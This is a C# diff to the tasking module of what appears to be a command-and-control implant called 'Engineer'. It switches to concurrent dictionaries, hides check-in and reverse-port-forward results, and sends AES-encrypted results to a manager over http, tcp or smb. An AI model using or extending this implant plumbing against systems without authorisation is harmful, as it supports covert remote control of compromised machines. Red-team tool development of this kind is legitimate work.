@@ -6,13 +6,14 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using Engineer.Commands;
+using System.Collections.Concurrent;
 
 namespace Engineer.Functions
 {
     internal class Tasking
     {
-        public static Dictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
-        public static Dictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
+        public static ConcurrentDictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
+        public static ConcurrentDictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
 
         public static void DealWithTasks(IEnumerable<EngineerTask> tasks)
         {
@@ -46,7 +47,7 @@ namespace Engineer.Functions
             try
             {
                 //add task to engTaskDic
-                engTaskDic.Add(task.Id, task);
+                engTaskDic.TryAdd(task.Id, task);
 
                 //make an EngineerTaskResult 
                 var taskResult = new EngineerTaskResult
@@ -88,7 +89,7 @@ namespace Engineer.Functions
         {
             if (!engTaskResultDic.ContainsKey(taskResult.Id))
             { 
-                engTaskResultDic.Add(taskResult.Id, taskResult);
+                engTaskResultDic.TryAdd(taskResult.Id, taskResult);
             }
         }
 
@@ -112,7 +113,7 @@ namespace Engineer.Functions
                     }
                     else
                     {
-                        engTaskResultDic[task.Id].Result = (output as string).JsonSerialize();
+                        engTaskResultDic[task.Id].Result = (output as byte[]);
                     }
                     engTaskResultDic[task.Id].Status = taskStatus;
                     engTaskResultDic[task.Id].ResponseType = taskResponseType;
@@ -144,24 +145,18 @@ namespace Engineer.Functions
                 }
                 else if (task.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    //Console.WriteLine($"first check in task {task.Id} complete");
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
-                    //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
                 }
                 else if (task.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    //Console.WriteLine($" check in task {task.Id} complete");
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
-                    //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
                 }
                 else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    //Console.WriteLine($"task {task.Id} complete");
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
-                    //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
                 }
                 else if(task.Command.Equals("canceltask",StringComparison.CurrentCultureIgnoreCase))
                 {
@@ -175,16 +170,14 @@ namespace Engineer.Functions
                 }
                 else
                 {
-                    //Console.WriteLine($"{DateTime.Now} task {task.Id} complete");
                     SendTaskResult(engTaskResultDic[task.Id]);
-                    //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Complete);
                 }
 
                 if(engTaskResultDic[task.Id].Status != EngTaskStatus.Running)
                 {
                     //if task is not running then remove it from the dictionary to save memory
-                    engTaskResultDic.Remove(task.Id);
-                    engTaskDic.Remove(task.Id);
+                    engTaskResultDic.TryRemove(task.Id, out _);
+                    engTaskDic.TryRemove(task.Id, out _);
                 }
 
                 }
@@ -206,7 +199,8 @@ namespace Engineer.Functions
                     Result = taskResult.Result,
                     IsHidden = taskResult.IsHidden,
                     Status = taskResult.Status,
-                    EngineerId = taskResult.EngineerId
+                    EngineerId = taskResult.EngineerId,
+                    ResponseType = taskResult.ResponseType,
                 };
                 if (Program.ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase))
                 {
@@ -216,7 +210,6 @@ namespace Engineer.Functions
             
                 else if (Program.ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    Program.OutboundResponsesSent += 1;
                     //Console.WriteLine("is tcp seralizing task result");
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                     var SeraliedTaskResult = tempResult.JsonSerialize();
@@ -227,7 +220,6 @@ namespace Engineer.Functions
             
                 else if (Program.ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                 {
-                    Program.OutboundResponsesSent += 1;
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                     var SeraliedTaskResult = tempResult.JsonSerialize();
                     var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
